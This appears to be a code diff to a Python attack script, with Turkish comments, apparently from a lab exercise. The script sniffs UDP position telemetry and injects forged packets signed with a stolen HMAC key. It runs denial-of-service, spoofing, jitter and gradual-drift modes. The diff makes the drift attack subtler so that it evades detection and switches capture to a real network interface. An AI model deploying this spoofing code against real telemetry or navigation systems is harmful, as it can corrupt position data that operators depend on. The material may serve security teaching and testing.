@@ -6,14 +6,15 @@ import time
 import hmac
 import hashlib
 import random
+import os
 
 #ag ayarlari
 BPF_FILTER = "udp port 5005 and not src port 5055" #kendi gonderdigimiz sahte paketleri (5055 portundan cikan) dinlemeyi engelledik
-IFACE      = "lo"
+IFACE      = "eth0"
 TARGET_IP  = "127.0.0.1"
 TARGET_PORT = 5005  #makine2'nin dinledigi port
 CMD_PORT    = 5007  #makine4'ten (gui) gelecek saldiri komutlarinin dinlenecegi port
-COMPROMISED_KEY = b"finch_ebg_atreides" #calinmis anahtar
+COMPROMISED_KEY = os.environ["SECRET_KEY"].encode() #calinmis anahtar
 
 current_attack_mode  = "NORMAL" #NORMAL, DOS, SPOOF, DRIFT, JITTER, OUT_OF_ORDER
 last_sniffed_payload = None     #araya girip degistirmek icin son yakalanan veri
@@ -62,12 +63,18 @@ def attack_engine():
 
     drift_increment  = 0.0
     onceki_mod       = "NORMAL"
+    drift_yon        = 1       
+    drift_ref_lat    = None    
+    drift_ref_lon    = None   
 
     while True:
         mode = current_attack_mode
 
         if mode != onceki_mod:
             drift_increment = 0.0
+            drift_yon       = random.choice([-1, 1])  
+            drift_ref_lat   = None                     
+            drift_ref_lon   = None                     
             onceki_mod      = mode
 
         if mode == "NORMAL":
@@ -98,24 +105,27 @@ def attack_engine():
                     fake_lat, fake_lon, fake_alt
                 )
                 sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
-            time.sleep(1)
+            time.sleep(0.5)
 
         elif mode == "DRIFT":
             #mikro-sapma: her saniye milimetrik ama surekli artan kayma
             if last_sniffed_payload:
-                #artis miktari 0.005-0.020'den 0.05-0.1'e yukseltildi
-                #eski deger (max 0.20 derece/10 paket) ISS'in normal hareketine cok yakindi
-                drift_increment += random.uniform(0.05, 0.1)
 
-                fake_lat = last_sniffed_payload['lat'] + drift_increment
-                fake_lon = last_sniffed_payload['lon'] + (drift_increment * random.choice([-1, 1]))
+                if drift_ref_lat is None:
+                    drift_ref_lat = last_sniffed_payload['lat']
+                    drift_ref_lon = last_sniffed_payload['lon']
+
+                drift_increment += random.uniform(0.0002, 0.0003) * 1000
+
+                fake_lat = drift_ref_lat + drift_increment
+                fake_lon = drift_ref_lon + (drift_increment * drift_yon)
 
                 pkt = generate_signed_packet(
-                    last_sniffed_payload['seq'] + 1,
+                    last_sniffed_payload['seq'] + 5,
                     fake_lat, fake_lon, last_sniffed_payload['alt']
                 )
                 sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
-            time.sleep(1)
+            time.sleep(0.5)
 
         elif mode == "JITTER":
             #gercek veriyi alir ama rastgele gecikmelerle yollar
